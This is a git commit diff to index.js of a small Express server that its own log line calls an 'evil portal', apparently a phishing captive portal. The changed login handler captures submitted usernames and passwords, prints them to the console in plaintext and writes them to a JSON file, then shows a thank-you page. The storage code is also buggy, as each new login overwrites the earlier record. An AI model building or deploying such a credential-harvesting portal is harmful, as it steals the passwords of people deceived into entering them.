26c939f7baba61a1bcf6b74bf2b2cdeaa15b4bb5
acandoo <117209328+acandoo@users.noreply.github.com>
2025-07-23 16:49:06 -0400

    MVP!!!!!

--- index.js
+++ index.js
@@ -1,36 +1,40 @@
-import { DatabaseSync } from 'node:sqlite'
+import fsp from 'node:fs/promises'
 import express from 'express'
 import path from 'node:path'
-import { pathToFileURL } from 'node:url'
+import { fileURLToPath } from 'node:url'
 
-const db = new DatabaseSync('./logins.db')
+const DB_FILE = './logins.json'
+await fsp.writeFile(DB_FILE, '[]')
+
+const data = JSON.parse(await fsp.readFile(DB_FILE))
+
 const app = express()
-
-db.exec(`CREATE TABLE IF NOT EXISTS logins (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  username TEXT,
-  password TEXT,
-  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-)`)
 
 // static files (HTML, CSS)
 app.use(express.static('public'))
 app.use(express.urlencoded({ extended: true }))
 
 // handle login
-app.post('/login', (req, res) => {
+app.post('/login', async (req, res) => {
     const { username, password } = req.body
-    db.run(`INSERT INTO logins (username, password) VALUES (?, ?)`, [
-        username,
-        password,
-    ])
+    console.log(username, password)
+    await fsp.writeFile(
+        DB_FILE,
+        JSON.stringify([
+            ...data,
+            {
+                username,
+                password
+            }
+        ])
+    )
     res.sendFile(
         path.join(
-            path.dirname(pathToFileURL(import.meta.url)),
+            path.dirname(fileURLToPath(import.meta.url)),
             'public',
             'thankyou.html'
         )
     )
 })
 
-app.listen(8000, () => console.log('evil portal on port 8080'))
+app.listen(8080, () => console.log('evil portal on port 8080'))
